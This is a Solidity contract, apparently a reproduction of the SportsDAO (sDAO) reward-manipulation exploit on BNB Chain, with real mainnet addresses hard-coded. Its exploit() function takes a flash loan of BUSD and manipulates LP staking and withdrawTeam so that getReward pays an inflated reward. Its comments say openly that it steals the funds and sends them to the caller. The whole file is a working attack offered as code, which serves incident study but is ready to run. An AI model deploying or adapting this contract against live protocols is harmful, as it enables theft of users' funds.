// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import 'hardhat/console.sol';

interface IFlashLoaner {
  function flashLoan(
    uint256 baseAmount,
    uint256 quoteAmount,
    address _assetTo,
    bytes calldata data
  ) external;
}

interface IPancakeRouter {
  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function quote(
    uint256,
    uint256,
    uint256
  ) external pure returns (uint256);
}

interface IBEP20 {
  function approve(address, uint256) external returns (bool);

  function stakeLP(uint256 _lpAmount) external;

  function balanceOf(address) external returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function withdrawTeam(address _token) external;

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) external returns (bool);

  function getReward() external;

  function PerTokenRewardLast() external view returns (uint256);

  function totalStakeReward() external view returns (uint256);

  function lastTotalStakeReward() external view returns (uint256);
}

interface IBEP20Pair is IBEP20 {
  function getReserves()
    external
    view
    returns (
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    );
}

contract SportsDAOAttack {
  IFlashLoaner flashLoaner = IFlashLoaner(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
  IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
  IBEP20 busd = IBEP20(0x55d398326f99059fF775485246999027B3197955);
  IBEP20 sdao = IBEP20(0x6666625Ab26131B490E7015333F97306F05Bf816);
  IBEP20 wbnb = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); // Technically not IBEP20
  IBEP20Pair busdsdao = IBEP20Pair(0x333896437125fF680f146f18c8A164Be831C4C71);

  function exploit() public {
    // Get the flashloan of 500 BUSD, calls `DPPFlashLoanCall()`
    console.log('BUSD balance before attack: ', busd.balanceOf(address(this)) / 1 ether);
    flashLoaner.flashLoan(0, 500 ether, address(this), 'A');
    console.log('BUSD balance after attack: ', busd.balanceOf(address(this)) / 1 ether);

    // Transfer all the we stole BUSD to ourselves
    busd.transfer(msg.sender, busd.balanceOf(address(this)));
  }

  function DPPFlashLoanCall(
    address,
    uint256,
    uint256,
    bytes calldata
  ) public {
    // Required approvals
    busd.approve(address(router), type(uint256).max);
    sdao.approve(address(router), type(uint256).max);
    sdao.approve(address(this), type(uint256).max); // Required for transferFrom
    wbnb.approve(address(router), type(uint256).max);
    busdsdao.approve(address(router), type(uint256).max);
    busdsdao.approve(address(sdao), type(uint256).max);
    busdsdao.approve(address(busd), type(uint256).max);

    // Swap 250 BUSD for sDAO
    address[] memory path = new address[](2);
    path[0] = address(busd);
    path[1] = address(sdao);

    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
      250 ether,
      0,
      path,
      address(this),
      block.timestamp * 5
    );

    // Swap half of our sDAO and all our remaining 250 BUSD for LP tokens
    router.addLiquidity(
      address(sdao),
      address(busd),
      sdao.balanceOf(address(this)) / 2,
      250 ether,
      0,
      0,
      address(this),
      block.timestamp * 5
    );

    // Stake half of our LP tokens
    sdao.stakeLP(busdsdao.balanceOf(address(this)) / 2);

    // Transfer the remaining sDAO to the LP token address using
    // `transferFrom()`, required to get a higher totalStakeReward
    sdao.transferFrom(address(this), address(busdsdao), sdao.balanceOf(address(this)));

    // Withdraw all the LP tokens to the TEAM
    sdao.withdrawTeam(address(busdsdao));

    // Transfer a tiny amount of our LP tokens to sDAO
    busdsdao.transfer(address(sdao), 0.013 ether);

    // Now claim reward.
    //
    // The `updateReward()` modifier will set `PerTokenRewardLast` to an a high
    // value since the amount of sDAO left in the contract is so little. This
    // will cause us to get a huge reward.
    sdao.getReward();

    // Swap all our sDAO for BUSD
    path[0] = address(sdao);
    path[1] = address(busd);

    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
      sdao.balanceOf(address(this)),
      0,
      path,
      address(this),
      block.timestamp * 5
    );

    // Return the BUSD we flash loaned
    busd.transfer(address(flashLoaner), 500 ether);
  }
}
